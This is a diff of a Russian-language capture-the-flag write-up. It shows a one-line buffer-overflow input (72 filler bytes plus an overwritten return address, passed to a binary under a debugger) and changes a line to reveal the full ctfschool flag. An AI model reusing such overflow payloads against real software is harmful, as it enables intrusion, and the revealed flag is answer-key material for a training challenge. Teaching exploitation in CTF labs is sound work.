@@ -36,7 +36,7 @@ r < <(python2.7 -c "print 'a'*72 + '\x50\x11\x40' + '\x00'*5 ")
 
 ![alt text](images/image-7.png)
 
-И получим наш флаг: ctfschool{The_cAke_1s_A_liE...}
+И получим наш флаг: ctfschool{The_cAke_1s_A_liE_aNd_eVeRytTing_is_A_L1e............}
 
 
 
